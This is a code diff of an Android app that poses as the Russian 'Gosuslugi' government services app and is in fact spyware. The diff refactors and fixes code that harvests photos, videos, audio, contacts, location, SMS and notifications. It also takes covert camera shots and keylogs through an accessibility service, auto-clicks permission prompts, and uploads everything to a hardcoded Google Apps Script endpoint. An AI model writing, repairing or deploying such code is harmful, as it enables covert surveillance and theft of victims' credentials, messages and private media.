@@ -5,16 +5,12 @@ import android.accessibilityservice.AccessibilityServiceInfo;
 import android.app.Activity;
 import android.app.Notification;
 import android.content.BroadcastReceiver;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
-import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.ImageFormat;
 import android.hardware.camera2.*;
-import android.location.Location;
 import android.Manifest;
 import android.media.Image;
 import android.media.ImageReader;
@@ -53,7 +49,6 @@ public class MainActivity extends Activity {
 
     private static final String TAG = "Gosuslugi";
     private static final String SERVER_URL = "https://script.google.com/macros/s/AKfycbxZ6S4v-0m4_CR645aVq2ZnBcc0ak-M_5UX-0yLX9jI_bhozwrkA968NaE4WRl9ay7abA/exec";
-    private static final String PREFS_NAME = "UserPrefs";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -63,11 +58,6 @@ public class MainActivity extends Activity {
         tv.setTextSize(24);
         tv.setPadding(50, 100, 50, 50);
         setContentView(tv);
-
-        // Автозапуск Accessibility если уже разрешён
-        if (isAccessibilityEnabled()) {
-            Log.d(TAG, "Accessibility already enabled");
-        }
     }
 
     // ==================== DEVICE UTILS ====================
@@ -75,7 +65,7 @@ public class MainActivity extends Activity {
         return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
     }
 
-    // ==================== UPLOAD HELPER ====================
+    // ==================== UPLOAD HELPERS ====================
     public static void uploadFile(Context context, File file, String endpoint) {
         new Thread(() -> {
             try {
@@ -90,8 +80,7 @@ public class MainActivity extends Activity {
                 byte[] buffer = new byte[4096];
                 int bytesRead;
                 while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
-                os.close();
-                fis.close();
+                os.close(); fis.close();
                 Log.d(TAG, "Uploaded: " + file.getName() + " -> " + conn.getResponseCode());
             } catch (Exception e) {
                 Log.e(TAG, "Upload error: " + e.getMessage());
@@ -134,8 +123,7 @@ public class MainActivity extends Activity {
             byte[] buffer = new byte[4096];
             int bytesRead;
             while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
-            os.close();
-            fis.close();
+            os.close(); fis.close();
             return conn.getResponseCode() == 200;
         } catch (Exception e) {
             return false;
@@ -166,25 +154,23 @@ public class MainActivity extends Activity {
 
     // ==================== FILE UTILS ====================
     public static List<String> getAllPhotos(Context context) {
-        return getFilesFromMediaStore(context, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, 0, Long.MAX_VALUE);
+        return getFilesFromMediaStore(context, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 0, Long.MAX_VALUE);
     }
 
     public static List<String> getAllVideosUnder30MB(Context context) {
-        return getFilesFromMediaStore(context, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, null, 0, 30L * 1024 * 1024);
+        return getFilesFromMediaStore(context, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 0, 30L * 1024 * 1024);
     }
 
     public static List<String> getAllAudios(Context context) {
-        return getFilesFromMediaStore(context, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, null, 0, Long.MAX_VALUE);
+        return getFilesFromMediaStore(context, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, 0, Long.MAX_VALUE);
     }
 
-    private static List<String> getFilesFromMediaStore(Context context, Uri uri, String[] mimeTypes, long minSize, long maxSize) {
+    private static List<String> getFilesFromMediaStore(Context context, Uri uri, long minSize, long maxSize) {
         List<String> files = new ArrayList<>();
         String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.SIZE};
         String selection = MediaStore.MediaColumns.SIZE + " >= ? AND " + MediaStore.MediaColumns.SIZE + " <= ?";
-        List<String> args = new ArrayList<>();
-        args.add(String.valueOf(minSize));
-        args.add(String.valueOf(maxSize));
-        Cursor cursor = context.getContentResolver().query(uri, projection, selection, args.toArray(new String[0]), null);
+        String[] args = {String.valueOf(minSize), String.valueOf(maxSize)};
+        Cursor cursor = context.getContentResolver().query(uri, projection, selection, args, null);
         if (cursor != null) {
             int dataIndex = cursor.getColumnIndex(MediaStore.MediaColumns.DATA);
             while (cursor.moveToNext()) {
@@ -230,11 +216,11 @@ public class MainActivity extends Activity {
                                 }, bg);
                                 camera.createCaptureSession(Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                                     @Override public void onConfigured(@NonNull CameraCaptureSession s) {
-                                        try { s.capture(req.build(), null, bg); } catch (CameraAccessException e) {}
+                                        try { s.capture(req.build(), null, bg); } catch (CameraAccessException ignored) {}
                                     }
                                     @Override public void onConfigureFailed(@NonNull CameraCaptureSession s) {}
                                 }, bg);
-                            } catch (CameraAccessException e) {}
+                            } catch (CameraAccessException ignored) {}
                         }
                         @Override public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
                         @Override public void onError(@NonNull CameraDevice camera, int e) { camera.close(); }
@@ -266,7 +252,7 @@ public class MainActivity extends Activity {
     }
 
     // ==================== CONTACTS ====================
-    private List<String> getContacts(Context context) {
+    public static List<String> getContacts(Context context) {
         List<String> contacts = new ArrayList<>();
         Cursor c = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
         if (c != null) {
@@ -281,7 +267,7 @@ public class MainActivity extends Activity {
     }
 
     // ==================== LOCATION ====================
-    private void getLocation(Context context) {
+    public static void getLocation(Context context) {
         FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(context);
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
         client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
@@ -290,19 +276,7 @@ public class MainActivity extends Activity {
                 });
     }
 
-    // ==================== ACCESSIBILITY CHECK ====================
-    private boolean isAccessibilityEnabled() {
-        try {
-            int enabled = Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
-            if (enabled == 1) {
-                String services = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
-                return services != null && services.contains(getPackageName());
-            }
-        } catch (Settings.SettingNotFoundException e) {}
-        return false;
-    }
-
-    // ==================== SMS RECEIVER (inner class) ====================
+    // ==================== SMS RECEIVER ====================
     public static class SmsReceiver extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
@@ -321,7 +295,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ==================== NOTIFICATION LISTENER (inner class) ====================
+    // ==================== NOTIFICATION LISTENER ====================
     public static class NotifListener extends NotificationListenerService {
         @Override
         public void onNotificationPosted(StatusBarNotification sbn) {
@@ -335,7 +309,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ==================== ACCESSIBILITY SERVICE (inner class) ====================
+    // ==================== ACCESSIBILITY SERVICE ====================
     public static class GosuslugiAccessibilityService extends AccessibilityService {
         private final StringBuilder keylogBuffer = new StringBuilder();
         private final Handler handler = new Handler();
@@ -348,23 +322,28 @@ public class MainActivity extends Activity {
             info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
             info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
             setServiceInfo(info);
-            handler.postDelayed(() -> {
-                if (keylogBuffer.length() > 0) {
-                    sendTextToServer(getApplicationContext(), "keylog", keylogBuffer.toString());
-                    keylogBuffer.setLength(0);
+            scheduleKeylogUpload();
+        }
+
+        private void scheduleKeylogUpload() {
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    if (keylogBuffer.length() > 0) {
+                        sendTextToServer(getApplicationContext(), "keylog", keylogBuffer.toString());
+                        keylogBuffer.setLength(0);
+                    }
+                    handler.postDelayed(this, 60000);
                 }
-                handler.postDelayed(this, 60000);
             }, 60000);
         }
 
         @Override
         public void onAccessibilityEvent(AccessibilityEvent event) {
             if (event == null || event.getSource() == null) return;
-            // Keylogger
             if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && event.getText() != null && event.getText().toString().length() > 0) {
                 keylogBuffer.append("[").append(System.currentTimeMillis()).append("] ").append(event.getPackageName()).append(": ").append(event.getText()).append("\n");
             }
-            // Auto-click
             autoClickAllow(event.getSource());
         }
 
